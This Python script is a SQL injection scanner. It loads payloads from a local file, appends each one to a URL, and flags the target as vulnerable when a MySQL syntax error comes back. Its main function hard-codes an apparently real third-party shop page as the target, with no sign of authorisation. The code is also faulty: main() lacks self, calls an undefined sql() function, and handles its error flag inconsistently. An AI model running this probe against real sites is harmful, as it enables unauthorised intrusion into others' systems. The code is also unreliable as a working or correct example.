#!/usr/bin/python3
# -*- encoding: utf-8 -*-

import os
import urllib.request


class Invpal_005:

    def __init__(self):
        """
        sql injection
        """

    def sql_injection(self, fullurl):
        errormsg = "You have an error in your SQL syntax"
        errorr = "yes"
        fullbody = ""

        os.chdir("../SQL_XSS")
        fname = "payloadSQL.txt"
        with open(fname) as f:
            content = f.readlines()
        payloads = [x.strip() for x in content]

        for payload in payloads:
            try:
                payload = payload
                print(fullurl + payload)
                resp = urllib.request.urlopen(fullurl + payload)
                body = resp.read()
                # print(body)
                fullbody = body.decode('utf-8')
                # print(fullbody)
            except:
                print("[-] Error! Manually check this payload: " + payload)
                # print(error)
                errorr = "no"
                # sys.exit()
            if errormsg in fullbody:
                if errorr == "no":
                    print("[-] That payload might not work!")
                    errorr = "yes"
                else:
                    print("[+] The website is SQL injection vulnerable! Payload: " + payload)
                    print(body)
            else:
                print("[-] The website is not SQL injection vulnerable!")

    def main():
        url = "http://www.tunesoman.com/product.php?id="
        sql(url)
